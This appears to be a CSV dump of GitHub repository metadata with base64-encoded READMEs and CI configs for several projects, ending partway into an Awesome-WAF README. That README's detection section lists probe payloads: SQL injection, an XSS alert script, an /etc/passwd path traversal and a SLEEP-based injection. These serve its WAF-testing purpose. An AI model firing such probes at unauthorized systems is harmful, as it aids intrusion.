ZCBtYWtlIHN1cmUsIHRoYXQgbm8gZmlyZXdhbGwgaXMgYmxvY2tpbmcgdGhl
IGNvbW11bmljYXRpb24pLgoKRGlzY3Vzc2lvbiBncm91cDogaHR0cHM6Ly9n
cm91cHMuZ29vZ2xlLmNvbS9mb3J1bS8jIWZvcnVtL2RkZHNhbXBsZQoKRGV2
ZWxvcG1lbnQgYmxvZzogaHR0cHM6Ly9jaXRlcnVzLmdpdGh1Yi5pby9kZGRz
YW1wbGUtY29yZS8KClRyZWxsbyBib2FyZDogaHR0cHM6Ly90cmVsbG8uY29t
L2IvUFRERlJ5eGQKClshW0J1aWxkIFN0YXR1c10oaHR0cHM6Ly90cmF2aXMt
Y2kub3JnL2NpdGVydXMvZGRkc2FtcGxlLWNvcmUuc3ZnP2JyYW5jaD1tYXN0
ZXIpXShodHRwczovL3RyYXZpcy1jaS5vcmcvY2l0ZXJ1cy9kZGRzYW1wbGUt
Y29yZSkK
",,"bGFuZ3VhZ2U6IGphdmEKamRrOgogIC0gb3JhY2xlamRrOA==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Backbone-relational',1598886,"b'Get and set relations (one-to-one, one-to-many, many-to-one) for Backbone models'",b'JavaScript',70,2382,,2382,False,b'https://api.github.com/repos/PaulUithol/Backbone-relational/forks',"IyBCYWNrYm9uZS1yZWxhdGlvbmFsCgpCYWNrYm9uZS1yZWxhdGlvbmFsIHBy
b3ZpZGVzIG9uZS10by1vbmUsIG9uZS10by1tYW55IGFuZCBtYW55LXRvLW9u
ZSByZWxhdGlvbnMgYmV0d2VlbiBtb2RlbHMgZm9yIFtCYWNrYm9uZV0oaHR0
cHM6Ly9naXRodWIuY29tL2RvY3VtZW50Y2xvdWQvYmFja2JvbmUpLgoKRG9j
dW1lbnRhdGlvbjogaHR0cDovL2JhY2tib25lcmVsYXRpb25hbC5vcmcKCkJh
Y2tib25lLXJlbGF0aW9uYWwgaXMgcmVsZWFzZWQgdW5kZXIgdGhlIFtNSVQg
bGljZW5zZV0oaHR0cHM6Ly9naXRodWIuY29tL1BhdWxVaXRob2wvQmFja2Jv
bmUtcmVsYXRpb25hbC9ibG9iL21hc3Rlci9MSUNFTlNFLnR4dCkuCkNvbnRy
aWJ1dG9yczogaHR0cHM6Ly9naXRodWIuY29tL1BhdWxVaXRob2wvQmFja2Jv
bmUtcmVsYXRpb25hbC9jb250cmlidXRvcnMK
",,"bGFuZ3VhZ2U6IG5vZGVfanMKbm9kZV9qczoKICAtICI4IgpiZWZvcmVfaW5z
dGFsbDoKICAtIG5wbSBpbnN0YWxsIC1nIG5wbQogIC0gbnBtIGluc3RhbGwg
LWcga2FybWEtY2xpQDEKc2NyaXB0OgogIC0gbnBtIHRlc3QKICAtIGthcm1h
IHN0YXJ0IC0tc2luZ2xlLXJ1biAtLWJyb3dzZXJzIFBoYW50b21KUyAtLWxv
ZGFzaApzdWRvOiBmYWxzZQpjYWNoZToKICBkaXJlY3RvcmllczoKICAgIC0g
bm9kZV9tb2R1bGVzCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'algorithms',32958,b'Ruby algorithms and data structures. C extensions',b'Ruby',20,2382,,2382,False,b'https://api.github.com/repos/kanwei/algorithms/forks',"IyBhbGdvcml0aG1zIFshW0J1aWxkIFN0YXR1c10oaHR0cHM6Ly90cmF2aXMt
Y2kub3JnL2thbndlaS9hbGdvcml0aG1zLnBuZyldKGh0dHBzOi8vdHJhdmlz
LWNpLm9yZy9rYW53ZWkvYWxnb3JpdGhtcykKCltBUEkgRG9jdW1lbnRhdGlv
bl0oaHR0cDovL2thbndlaS5naXRodWIuaW8vYWxnb3JpdGhtcy8pCgojIyBE
RVNDUklQVElPTjoKClN0YXJ0ZWQgYXMgYSBbR29vZ2xlIFN1bW1lciBvZiBD
b2RlIDIwMDhdKGh0dHA6Ly9jb2RlLmdvb2dsZS5jb20vc29jLzIwMDgvcnVi
eS9hYm91dC5odG1sKSBwcm9qZWN0CgpXcml0dGVuIGJ5IFtLYW53ZWkgTGld
KGh0dHA6Ly9rYW53ZWkuY29tLyksIG1lbnRvcmVkIGJ5IEF1c3RpbiBaaWVn
bGVyCgojIyMgT3JpZ2luYWwgUHJvcG9zYWw6ICMjIwoKVXNpbmcgdGhlIHJp
Z2h0IGRhdGEgc3RydWN0dXJlIG9yIGFsZ29yaXRobSBmb3IgdGhlIHNpdHVh
dGlvbiBpcyBhbiBpbXBvcnRhbnQKYXNwZWN0IG9mIHByb2dyYW1taW5nLiBJ
biBjb21wdXRlciBzY2llbmNlIGxpdGVyYXR1cmUsIG1hbnkgZGF0YSBzdHJ1
Y3R1cmVzCmFuZCBhbGdvcml0aG1zIGhhdmUgYmVlbiByZXNlYXJjaGVkIGFu
ZCBleHRlbnNpdmVseSBkb2N1bWVudGVkLiBIb3dldmVyLCB0aGVyZQppcyBz
dGlsbCBubyBzdGFuZGFyZCBsaWJyYXJ5IGluIFJ1YnkgaW1wbGVtZW50aW5n
IHVzZWZ1bCBzdHJ1Y3R1cmVzIGFuZAphbGdvcml0aG1zIGxpa2UgUmVkL0Js
YWNrIFRyZWVzLCB0cmllcywgZGlmZmVyZW50IHNvcnRpbmcgYWxnb3JpdGht
cywgZXRjLgpUaGlzIHByb2plY3Qgd2lsbCBjcmVhdGUgc3VjaCBhIGxpYnJh
cnkgd2l0aCBkb2N1bWVudGF0aW9uIG9uIHdoZW4gdG8gdXNlIGEKcGFydGlj
dWxhciBzdHJ1Y3R1cmUvYWxnb3JpdGhtLiBJdCB3aWxsIGFsc28gY29tZSB3
aXRoIGEgYmVuY2htYXJrIHN1aXRlIHRvCmNvbXBhcmUgcGVyZm9ybWFuY2Ug
aW4gZGlmZmVyZW50IHNpdHVhdGlvbnMuCgojIyBDT01QTEVURUQ6CgogICAg
KiBIZWFwcyAgICAgICAgICAgICAgQ29udGFpbmVyczo6SGVhcCwgQ29udGFp
bmVyczo6TWF4SGVhcCwgQ29udGFpbmVyczo6TWluSGVhcAogICAgKiBQcmlv
cml0eSBRdWV1ZSAgICAgQ29udGFpbmVyczo6UHJpb3JpdHlRdWV1ZQogICAg
KiBEZXF1ZSAgICAgICAgICAgICAgQ29udGFpbmVyczo6RGVxdWUsIENvbnRh
aW5lcnM6OkNEZXF1ZSAoQyBleHQpCiAgICAqIFN0YWNrICAgICAgICAgICAg
ICBDb250YWluZXJzOjpTdGFjawogICAgKiBRdWV1ZSAgICAgICAgICAgICAg
Q29udGFpbmVyczo6UXVldWUKICAgICogUmVkLUJsYWNrIFRyZWVzICAgIENv
bnRhaW5lcnM6OlJCVHJlZU1hcCwgQ29udGFpbmVyczo6Q1JCVHJlZU1hcCAo
QyBleHQpCiAgICAqIFNwbGF5IFRyZWVzICAgICAgICBDb250YWluZXJzOjpT
cGxheVRyZWVNYXAsIENvbnRhaW5lcnM6OkNTcGxheVRyZWVNYXAgKEMgZXh0
KQogICAgKiBUcmllcyAgICAgICAgICAgICAgQ29udGFpbmVyczo6VHJpZQog
ICAgKiBTdWZmaXggQXJyYXkgICAgICAgQ29udGFpbmVyczo6U3VmZml4QXJy
YXkKCiAgICAqIFNlYXJjaCBhbGdvcml0aG1zCiAgICAgIC0gQmluYXJ5IFNl
YXJjaCAgICAgICAgICAgIEFsZ29yaXRobXM6OlNlYXJjaC5iaW5hcnlfc2Vh
cmNoCiAgICAgIC0gS251dGgtTW9ycmlzLVByYXR0ICAgICAgIEFsZ29yaXRo
bXM6OlNlYXJjaC5rbXBfc2VhcmNoCiAgICAqIFNvcnRpbmcgYWxnb3JpdGht
cyAgICAgICAgICAgCiAgICAgIC0gQnViYmxlIHNvcnQgICAgICAgICAgICAg
IEFsZ29yaXRobXM6OlNvcnQuYnViYmxlX3NvcnQKICAgICAgLSBDb21iIHNv
cnQgICAgICAgICAgICAgICAgQWxnb3JpdGhtczo6U29ydC5jb21iX3NvcnQK
ICAgICAgLSBTZWxlY3Rpb24gc29ydCAgICAgICAgICAgQWxnb3JpdGhtczo6
U29ydC5zZWxlY3Rpb25fc29ydAogICAgICAtIEhlYXBzb3J0ICAgICAgICAg
ICAgICAgICBBbGdvcml0aG1zOjpTb3J0LmhlYXBzb3J0CiAgICAgIC0gSW5z
ZXJ0aW9uIHNvcnQgICAgICAgICAgIEFsZ29yaXRobXM6OlNvcnQuaW5zZXJ0
aW9uX3NvcnQKICAgICAgLSBTaGVsbCBzb3J0ICAgICAgICAgICAgICAgQWxn
b3JpdGhtczo6U29ydC5zaGVsbF9zb3J0CiAgICAgIC0gUXVpY2tzb3J0ICAg
ICAgICAgICAgICAgIEFsZ29yaXRobXM6OlNvcnQucXVpY2tzb3J0CiAgICAg
IC0gTWVyZ2Vzb3J0ICAgICAgICAgICAgICAgIEFsZ29yaXRobXM6OlNvcnQu
bWVyZ2Vzb3J0CiAgICAgIC0gRHVhbC1QaXZvdCBRdWlja3NvcnQgICAgIEFs
Z29yaXRobXM6OlNvcnQuZHVhbHBpdm90cXVpY2tzb3J0CgojIyBTWU5PUFNJ
UzoKCiAgICByZXF1aXJlICdydWJ5Z2VtcycKICAgIHJlcXVpcmUgJ2FsZ29y
aXRobXMnCgogICAgbWF4X2hlYXAgPSBDb250YWluZXJzOjpNYXhIZWFwLm5l
dwoKICAgICMgVG8gbm90IGhhdmUgdG8gdHlwZSAiQ29udGFpbmVyczo6IiBi
ZWZvcmUgZWFjaCBjbGFzcywgdXNlOgogICAgaW5jbHVkZSBDb250YWluZXJz
CiAgICBtYXhfaGVhcCA9IE1heEhlYXAubmV3CgojIyBSRVFVSVJFTUVOVFM6
CgoqIFJ1YnkgMS44LCBSdWJ5IDEuOSwgSlJ1YnkKKiBDIGV4dGVuc2lvbnMg
KG9wdGlvbmFsLCBidXQgdmVyeSBtdWNoIHJlY29tbWVuZGVkIGZvciB2YXN0
IHBlcmZvcm1hbmNlIGJlbmVmaXRzKQoKIyMgTElDRU5TRToKClNlZSBbTElD
RU5TRS5tZF0oTElDRU5TRS5tZCkuCg==
",,"bGFuZ3VhZ2U6IHJ1YnkKcnZtOgogIC0gMi4yCiAgLSAyLjEKICAtIDIuMAog
IC0gMS45CiAgCmJlZm9yZV9pbnN0YWxsOgogIC0gZ2VtIHVwZGF0ZSAtLXN5
c3RlbQogIC0gZ2VtIHVwZGF0ZSBidW5kbGVyCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Awesome-WAF',164564630,b'\xf0\x9f\x94\xa5 Everything awesome about web-application firewalls (WAF).',b'Python',0,2382,,2382,False,b'https://api.github.com/repos/0xInfection/Awesome-WAF/forks',"IyBBd2Vzb21lIFdBRiBbIVtBd2Vzb21lXShodHRwczovL2Nkbi5yYXdnaXQu
Y29tL3NpbmRyZXNvcmh1cy9hd2Vzb21lL2Q3MzA1ZjM4ZDI5ZmVkNzhmYTg1
NjUyZTNhNjNlMTU0ZGQ4ZTg4MjkvbWVkaWEvYmFkZ2Uuc3ZnICJBd2Vzb21l
IildKGh0dHBzOi8vZ2l0aHViLmNvbS8weGluZmVjdGlvbi9hd2Vzb21lLXdh
ZikKPiBFdmVyeXRoaW5nIGF3ZXNvbWUgYWJvdXQgd2ViIGFwcGxpY2F0aW9u
IGZpcmV3YWxscyAoV0FGcykuIPCflKUKPgo+IF9fRm9yZXdvcmQ6X18gVGhp
cyB3YXMgb3JpZ2luYWxseSBteSBvd24gY29sbGVjdGlvbiBvbiBXQUZzLiBJ
IGFtIG9wZW4tc291cmNpbmcgaXQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxs
IGJlIHVzZWZ1bCBmb3IgcGVudGVzdGVycyBhbmQgcmVzZWFyY2hlcnMgb3V0
IHRoZXJlLiBZb3UgbWlnaHQgd2FudCB0byBrZWVwIHRoaXMgcmVwbyBvbiBh
IHdhdGNoLCBzaW5jZSBpdCB3aWxsIGJlIHVwZGF0ZWQgcmVndWxhcmx5LiAi
VGhlIGNvbW11bml0eSBqdXN0IGxlYXJucyBmcm9tIGVhY2ggb3RoZXIuIiBf
XyNTaGFyaW5naXNDYXJpbmdfXwoKIVtNYWluIExvZ29dKGltYWdlcy9ob3ct
d2Fmcy13b3JrLnBuZyAnSG93IHdhZnMgd29yaycpCgpfX0EgQ29uY2lzZSBE
ZWZpbml0aW9uOl9fIEEgd2ViIGFwcGxpY2F0aW9uIGZpcmV3YWxsIGlzIGEg
c2VjdXJpdHkgcG9saWN5IGVuZm9yY2VtZW50IHBvaW50IHBvc2l0aW9uZWQg
YmV0d2VlbiBhIHdlYiBhcHBsaWNhdGlvbiBhbmQgdGhlIGNsaWVudCBlbmRw
b2ludC4gVGhpcyBmdW5jdGlvbmFsaXR5IGNhbiBiZSBpbXBsZW1lbnRlZCBp
biBzb2Z0d2FyZSBvciBoYXJkd2FyZSwgcnVubmluZyBpbiBhbiBhcHBsaWFu
Y2UgZGV2aWNlLCBvciBpbiBhIHR5cGljYWwgc2VydmVyIHJ1bm5pbmcgYSBj
b21tb24gb3BlcmF0aW5nIHN5c3RlbS4gSXQgbWF5IGJlIGEgc3RhbmQtYWxv
bmUgZGV2aWNlIG9yIGludGVncmF0ZWQgaW50byBvdGhlciBuZXR3b3JrIGNv
bXBvbmVudHMuICooU291cmNlOiBbUENJIERTUyBJUyA2LjZdKGh0dHBzOi8v
d3d3LnBjaXNlY3VyaXR5c3RhbmRhcmRzLm9yZy9kb2N1bWVudHMvaW5mb3Jt
YXRpb25fc3VwcGxlbWVudF82LjYucGRmKSkqCgpGZWVsIGZyZWUgdG8gW2Nv
bnRyaWJ1dGVdKENPTlRSSUJVVElORy5tZCkuCgojIyMgQ29udGVudHM6Ci0g
W0ludHJvZHVjdGlvbl0oI2ludHJvZHVjdGlvbikKICAgIC0gW0hvdyBXQUZz
IFdvcmtdKCNob3ctd2Fmcy13b3JrKQogICAgLSBbT3BlcmF0aW9uIE1vZGVz
XSgjb3BlcmF0aW9uLW1vZGVzKQotIFtUZXN0aW5nIE1ldGhvZG9sb2d5XSgj
dGVzdGluZy1tZXRob2RvbG9neSkKICAgIC0gW1doZXJlIFRvIExvb2tdKCN3
aGVyZS10by1sb29rKQogICAgLSBbRGV0ZWN0aW9uIFRlY2huaXF1ZXNdKCNk
ZXRlY3Rpb24tdGVjaG5pcXVlcykKLSBbV0FGIEZpbmdlcnByaW50c10oI3dh
Zi1maW5nZXJwcmludHMpCi0gW0V2YXNpb24gVGVjaG5pcXVlc10oI2V2YXNp
b24tdGVjaG5pcXVlcykKICAgIC0gW0Z1enppbmcvQnJ1dGVmb3JjaW5nXSgj
ZnV6emluZ2JydXRlZm9yY2luZykKICAgIC0gW1JlZ2V4IFJldmVyc2luZ10o
I3JlZ2V4LXJldmVyc2luZykKICAgIC0gW09iZnVzY2F0aW9uL0VuY29kaW5n
XSgjb2JmdXNjYXRpb24pCiAgICAtIFtCcm93c2VyIEJ1Z3NdKCNicm93c2Vy
LWJ1Z3MpCiAgICAtIFtIVFRQIEhlYWRlciBTcG9vZmluZ10oI3JlcXVlc3Qt
aGVhZGVyLXNwb29maW5nKQogICAgLSBbR29vZ2xlIERvcmtzIEFwcHJvYWNo
XSgjZ29vZ2xlLWRvcmtzLWFwcHJvYWNoKQotIFtLbm93biBCeXBhc3Nlc10o
I2tub3duLWJ5cGFzc2VzKQotIFtBd2Vzb21lIFRvb2xpbmddKCNhd2Vzb21l
LXRvb2xzKQogICAgLSBbRmluZ2VycHJpbnRpbmddKCNmaW5nZXJwcmludGlu
ZykKICAgIC0gW1Rlc3RpbmddKCN0ZXN0aW5nKQogICAgLSBbRXZhc2lvbl0o
I2V2YXNpb24pCi0gW0Jsb2dzICYgV3JpdGV1cHNdKCNibG9ncy1hbmQtd3Jp
dGV1cHMpCi0gW1ZpZGVvIFByZXNlbnRhdGlvbnNdKCN2aWRlby1wcmVzZW50
YXRpb25zKQotIFtSZXNlYXJjaCBQcmVzZW50YXRpb25zICYgUGFwZXJzXSgj
cHJlc2VudGF0aW9ucy0tcmVzZWFyY2gtcGFwZXJzKQogICAgLSBbUmVzZWFy
Y2ggUGFwZXJzXSgjcmVzZWFyY2gtcGFwZXJzKQogICAgLSBbUHJlc2VudGF0
aW9uIFNsaWRlc10oI3ByZXNlbnRhdGlvbnMpCi0gW0xpY2Vuc2luZyAmIENy
ZWRpdHNdKCNjcmVkaXRzLS1saWNlbnNlKQoKIyMgSW50cm9kdWN0aW9uOgoj
IyMgSG93IFdBRnMgV29yazoKLSBVc2luZyBhIHNldCBvZiBydWxlcyB0byBk
aXN0aW5ndWlzaCBiZXR3ZWVuIG5vcm1hbCByZXF1ZXN0cyBhbmQgbWFsaWNp
b3VzIHJlcXVlc3RzLgotIFNvbWV0aW1lcyB0aGV5IHVzZSBhIGxlYXJuaW5n
IG1vZGUgdG8gYWRkIHJ1bGVzIGF1dG9tYXRpY2FsbHkgdGhyb3VnaCBsZWFy
bmluZyBhYm91dCB1c2VyIGJlaGF2aW91ci4KCiMjIyBPcGVyYXRpb24gTW9k
ZXM6Ci0gX19OZWdhdGl2ZSBNb2RlbCAoQmxhY2tsaXN0IGJhc2VkKV9fIC0g
QSBibGFja2xpc3RpbmcgbW9kZWwgdXNlcyBwcmUtc2V0IHNpZ25hdHVyZXMg
dG8gYmxvY2sgd2ViIHRyYWZmaWMgdGhhdCBpcyBjbGVhcmx5IG1hbGljaW91
cywgYW5kIHNpZ25hdHVyZXMgZGVzaWduZWQgdG8gcHJldmVudCBhdHRhY2tz
IHdoaWNoIGV4cGxvaXQgY2VydGFpbiB3ZWJzaXRlIGFuZCB3ZWIgYXBwbGlj
YXRpb24gdnVsbmVyYWJpbGl0aWVzLiBCbGFja2xpc3RpbmcgbW9kZWwgd2Vi
IGFwcGxpY2F0aW9uIGZpcmV3YWxscyBhcmUgYSBncmVhdCBjaG9pY2UgZm9y
IHdlYnNpdGVzIGFuZCB3ZWIgYXBwbGljYXRpb25zIG9uIHRoZSBwdWJsaWMg
aW50ZXJuZXQsIGFuZCBhcmUgaGlnaGx5IGVmZmVjdGl2ZSBhZ2FpbnN0IGFu
IG1ham9yIHR5cGVzIG9mIEREb1MgYXR0YWNrcy4gRWcuIFJ1bGUgZm9yIGJs
b2NraW5nIGFsbCBgPHNjcmlwdD4qPC9zY3JpcHQ+YCBpbnB1dHMuCi0gX19Q
b3NpdGl2ZSBNb2RlbCAoV2hpdGVsaXN0IGJhc2VkKV9fIC0gQSB3aGl0ZWxp
c3RpbmcgbW9kZWwgb25seSBhbGxvd3Mgd2ViIHRyYWZmaWMgYWNjb3JkaW5n
IHRvIHNwZWNpZmljYWxseSBjb25maWd1cmVkIGNyaXRlcmlhLiBGb3IgZXhh
bXBsZSwgaXQgY2FuIGJlIGNvbmZpZ3VyZWQgdG8gb25seSBhbGxvdyBIVFRQ
IEdFVCByZXF1ZXN0cyBmcm9tIGNlcnRhaW4gSVAgYWRkcmVzc2VzLiBUaGlz
IG1vZGVsIGNhbiBiZSB2ZXJ5IGVmZmVjdGl2ZSBmb3IgYmxvY2tpbmcgcG9z
c2libGUgY3liZXItYXR0YWNrcywgYnV0IHdoaXRlbGlzdGluZyB3aWxsIGJs
b2NrIGEgbG90IG9mIGxlZ2l0aW1hdGUgdHJhZmZpYy4gV2hpdGVsaXN0aW5n
IG1vZGVsIGZpcmV3YWxscyBhcmUgcHJvYmFibHkgYmVzdCBmb3Igd2ViIGFw
cGxpY2F0aW9ucyBvbiBhbiBpbnRlcm5hbCBuZXR3b3JrIHRoYXQgYXJlIGRl
c2lnbmVkIHRvIGJlIHVzZWQgYnkgb25seSBhIGxpbWl0ZWQgZ3JvdXAgb2Yg
cGVvcGxlLCBzdWNoIGFzIGVtcGxveWVlcy4KLSBfX01peGVkL0h5YnJpZCBN
b2RlbCAoSW5jbHVzaXZlIG1vZGVsKV9fIC0gQSBoeWJyaWQgc2VjdXJpdHkg
bW9kZWwgaXMgb25lIHRoYXQgYmxlbmRzIGJvdGggd2hpdGVsaXN0aW5nIGFu
ZCBibGFja2xpc3RpbmcuIERlcGVuZGluZyBvbiBhbGwgc29ydHMgb2YgY29u
ZmlndXJhdGlvbiBzcGVjaWZpY3MsIGh5YnJpZCBmaXJld2FsbHMgY291bGQg
YmUgdGhlIGJlc3QgY2hvaWNlIGZvciBib3RoIHdlYiBhcHBsaWNhdGlvbnMg
b24gaW50ZXJuYWwgbmV0d29ya3MgYW5kIHdlYiBhcHBsaWNhdGlvbnMgb24g
dGhlIHB1YmxpYyBpbnRlcm5ldC4KCiMjIFRlc3RpbmcgTWV0aG9kb2xvZ3k6
CiMjIyBXaGVyZSBUbyBMb29rOgotIEFsd2F5cyBsb29rIG91dCBmb3IgY29t
bW9uIHBvcnRzIHRoYXQgZXhwb3NlIHRoYXQgYSBXQUYsIG5hbWVseSBgODBg
LCBgNDQzYCwgYDgwMDBgLCBgODAwOGAsIGA4MDgwYCBhbmQgYDgwODhgIHBv
cnRzLgogICAgPiBfX1RpcDpfXyBZb3UgY2FuIHVzZSBhdXRvbWF0ZSB0aGlz
IGVhc2lseSBieSBjb21tYW5kbGluZSB1c2luZyB0b29scyBsaWtlIGxpa2Ug
W2NVUkxdKGh0dHBzOi8vZ2l0aHViLmNvbS9jdXJsL2N1cmwpLgotIFNvbWUg
V0FGcyBzZXQgdGhlaXIgb3duIGNvb2tpZXMgaW4gcmVxdWVzdHMgKGVnLiBD
aXRyaXggTmV0c2NhbGVyLCBZdW5zdW8gV0FGKS4KLSBTb21lIGFzc29jaWF0
ZSB0aGVtc2VsdmVzIHdpdGggc2VwYXJhdGUgaGVhZGVycyAoZWcuIEFucXVh
bmJhbyBXQUYsIEFtYXpvbiBBV1MgV0FGKS4gCi0gU29tZSBvZnRlbiBhbHRl
ciBoZWFkZXJzIGFuZCBqdW1ibGUgY2hhcmFjdGVycyB0byBjb25mdXNlIGF0
dGFja2VyIChlZy4gTmV0c2NhbGVyLCBCaWctSVApLgotIFNvbWUgZXhwb3Nl
IHRoZW1zZWx2ZXMgaW4gdGhlIGBTZXJ2ZXJgIGhlYWRlciAoZWcuIEFwcHJv
YWNoLCBXVFMgV0FGKS4KLSBTb21lIFdBRnMgZXhwb3NlIHRoZW1zZWx2ZXMg
aW4gdGhlIHJlc3BvbnNlIGNvbnRlbnQgKGVnLiBEb3REZWZlbmRlciwgQXJt
b3IsIFNpdGVsb2NrKS4KLSBPdGhlciBXQUZzIHJlcGx5IHdpdGggdW51c3Vh
bCByZXNwb25zZSBjb2RlcyB1cG9uIG1hbGljaW91cyByZXF1ZXN0cyAoZWcu
IFdlYktuaWdodCwgMzYwIFdBRikuCgojIyMgRGV0ZWN0aW9uIFRlY2huaXF1
ZXM6ClRvIGlkZW50aWZ5IFdBRnMsIHdlIG5lZWQgdG8gKGR1bW15KSBwcm92
b2tlIGl0LgoxLiBNYWtlIGEgbm9ybWFsIEdFVCByZXF1ZXN0IGZyb20gYSBi
cm93c2VyLCBpbnRlcmNlcHQgYW5kIHJlY29yZCByZXNwb25zZSBoZWFkZXJz
IChzcGVjaWZpY2FsbHkgY29va2llcykuCjIuIE1ha2UgYSByZXF1ZXN0IGZy
b20gY29tbWFuZCBsaW5lIChlZy4gY1VSTCksIGFuZCB0ZXN0IHJlc3BvbnNl
IGNvbnRlbnQgYW5kIGhlYWRlcnMgKG5vIHVzZXItYWdlbnQgaW5jbHVkZWQp
LgozLiBNYWtlIEdFVCByZXF1ZXN0cyB0byByYW5kb20gb3BlbiBwb3J0cyBh
bmQgZ3JhYiBiYW5uZXJzIHdoaWNoIG1pZ2h0IGV4cG9zZSB0aGUgV0FGcyBp
ZGVudGl0eS4KNC4gSWYgdGhlcmUgaXMgYSBsb2dpbiBwYWdlIHNvbWV3aGVy
ZSwgdHJ5IHNvbWUgY29tbW9uIChlYXNpbHkgZGV0ZWN0YWJsZSkgcGF5bG9h
ZHMgbGlrZSBgIiBvciAxID0gMSAtLWAuCjUuIElmIHRoZXJlIGlzIHNvbWUg
aW5wdXQgZmllbGQgc29tZXdoZXJlLCB0cnkgd2l0aCBub2lzeSBwYXlsb2Fk
cyBsaWtlIGA8c2NyaXB0PmFsZXJ0KCk8L3NjcmlwdD5gLgo2LiBBdHRhY2gg
YSBkdW1teSBgLi4vLi4vLi4vZXRjL3Bhc3N3ZGAgdG8gYSByYW5kb20gcGFy
YW1ldGVyIGF0IGVuZCBvZiBVUkwuCjcuIEFwcGVuZCBzb21lIGNhdGNoeSBr
ZXl3b3JkcyBsaWtlIGAnIE9SIFNMRUVQKDUpIE9SICdgIGF0IGVuZCBvZiBV
UkxzIHRvIGFueSByYW5kb20gcGFyYW1ldGVyLgo4LiBNYWtlIEdFVCByZXF1
ZXN0cyB3aXRoIG91dGRhdGVkIHByb3RvY29scyBsaWtlIGBIVFRQLzAuOWAg
KGBIVFRQLzAuOWAgZG9lcyBub3Qgc3VwcG9ydCBQT1NUIHR5cGUgcXVlcmll
cykuCjkuIE1hbnkgYSB0aW1lcywgdGhlIFdBRiB2YXJpZXMgdGhlIGBTZXJ2
ZXJgIGhlYWRlciB1cG9uIGRpZmZlcmVudCB0eXBlcyBvZiBpbnRlcmFjdGlv
bnMuCjEwLiBEcm9wIEFjdGlvbiBUZWNobmlxdWUgLSBTZW5kIGEgcmF3IGNy
YWZ0ZWQgRklOL1JTVCBwYWNrZXQgdG8gc2VydmVyIGFuZCBpZGVudGlmeSBy
ZXNwb25zZS4KICAgID4gX19UaXA6X18gVGhpcyBtZXRob2QgY291bGQgYmUg
ZWFzaWx5IGFjaGlldmVkIHdpdGggdG9vbHMgbGlrZSBbSFBpbmczXShodHRw
Oi8vd3d3LmhwaW5nLm9yZykgb3IgW1NjYXB5XShodHRwczovL3NjYXB5Lm5l
dCkuCjExLiBTaWRlIENoYW5uZWwgQXR0YWNrcyAtIEV4YW1pbmUgdGhlIHRp
bWluZyBiZWhhdmlvdXIgb2YgdGhlIHJlcXVlc3QgYW5kIHJlc3BvbnNlIGNv
bnRlbnQuIAoKIyMgV0FGIEZpbmdlcnByaW50cwpXYW5uYSBmaW5nZXJwcmlu
dCBXQUZzPyBMZXRzIHNlZSBob3cuCj4gX19OT1RFX186IFRoaXMgc2VjdGlv
biBjb250YWlucyBtYW51YWwgV0FGIGRldGVjdGlvbiB0ZWNobmlxdWVzLiBZ
b3UgbWlnaHQgd2FudCB0byBzd2l0Y2ggb3ZlciB0byBbbmV4dCBzZWN0aW9u
XSgjZXZhc2lvbi10ZWNobmlxdWVzKS4gCgo8dGFibGU+CiAgICA8dHI+CiAg
ICAgICAgPHRkIGFsaWduPSJjZW50ZXIiPjxiPldBRjwvYj48L3RkPgogICAg
ICAgIDx0ZCBhbGlnbj0iY2VudGVyIj48Yj5GaW5nZXJwcmludHM8L2I+PC90
ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAg
ICAzNjAKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6PC9i
PiBFYXN5IDwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9u
IE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgog
ICAgICAgICAgICAgICAgICAgIDxsaT5SZXR1cm5zIHN0YXR1cyBjb2RlIDxj
b2RlPjQ5MzwvY29kZT4gdXBvbiB1bnVzdWFsIHJlcXVlc3RzLjwvbGk+CiAg
ICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrcGFnZSBtYXkgY29udGFpbiBy
ZWZlcmVuY2UgdG8gPGNvZGU+d3p3cy13YWYtY2dpLzwvY29kZT4gZGlyZWN0
b3J5LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVz
cG9uc2UgcGFnZSBzb3VyY2UgbWF5IGNvbnRhaW46CiAgICAgICAgICAgICAg
ICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgICAgICA8bGk+UmVmZXJl
bmNlIHRvIDxjb2RlPndhbmdzaGFuLjM2MC5jbjwvY29kZT4gVVJMLjwvbGk+
CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5Tb3JyeSEgWW91
ciBhY2Nlc3MgaGFzIGJlZW4gaW50ZXJjZXB0ZWQgYmVjYXVzZSB5b3VyIGxp
bmtzIG1heSB0aHJlYXRlbiB3ZWJzaXRlIHNlY3VyaXR5LjwvY29kZT4gdGV4
dCBzbmlwcGV0LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPC91bD4KICAg
